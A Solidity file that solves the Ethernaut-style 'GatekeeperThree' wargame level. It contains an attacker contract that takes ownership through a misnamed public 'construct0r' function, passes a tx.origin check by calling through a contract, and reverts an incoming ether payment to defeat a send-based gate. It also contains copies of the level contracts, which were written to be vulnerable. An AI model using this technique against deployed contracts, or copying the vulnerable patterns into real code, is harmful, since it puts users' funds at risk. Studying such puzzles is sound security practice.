// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;
import {Script, console} from "forge-std/Script.sol";

contract Cracked28_GatekeeperThree {
    GatekeeperThree public target;

    constructor(address payable adr) {
        target = GatekeeperThree(adr);
        target.construct0r();
    }

    function enter() public {
        (bool res, ) = address(target).call(abi.encodeWithSignature("enter()"));
        //target.enter();
        console.log("res is", res);
        require(res);
    }

    function withdraw() public {
        (bool res, ) = msg.sender.call{value: address(this).balance}("");
    }

    fallback() external payable {
        if (msg.value == 0.001 ether) revert("msgvalue is 0.001 ether");
    }
}

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
